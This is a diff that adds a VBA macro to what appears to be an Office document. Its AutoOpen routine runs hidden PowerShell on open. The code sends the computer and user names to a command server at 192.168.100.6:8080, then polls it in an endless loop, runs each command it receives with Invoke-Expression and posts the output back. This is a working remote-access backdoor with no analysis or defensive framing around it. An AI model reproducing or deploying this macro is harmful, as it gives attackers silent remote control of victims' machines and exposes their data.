@@ -1,0 +1,7 @@
+Sub AutoOpen()
+    Main
+End Sub
+
+Sub Main()
+    Shell "powershell.exe /c Start-Process $PSHOME\powershell.exe -ArgumentList {Set-Variable -Name s -Value ('192.168.100.6:8080');Set-Variable -Name i -Value ('a8f3f783-1b38592e-f731cbf8');Set-Variable -Name p -Value ('http://');Set-Variable -Name v -Value (Invoke-RestMethod -UseBasicParsing -Headers @{""Authorization""=$i;} -Uri $p$s/a8f3f783/$env:COMPUTERNAME/$env:USERNAME);for (;;){Set-Variable -Name c -Value (Invoke-RestMethod -Headers @{""Authorization""=$i;} -UseBasicParsing -Uri $p$s/1b38592e);if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/f731cbf8 -Method POST -Headers @{""Authorization""=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden"
+End Sub
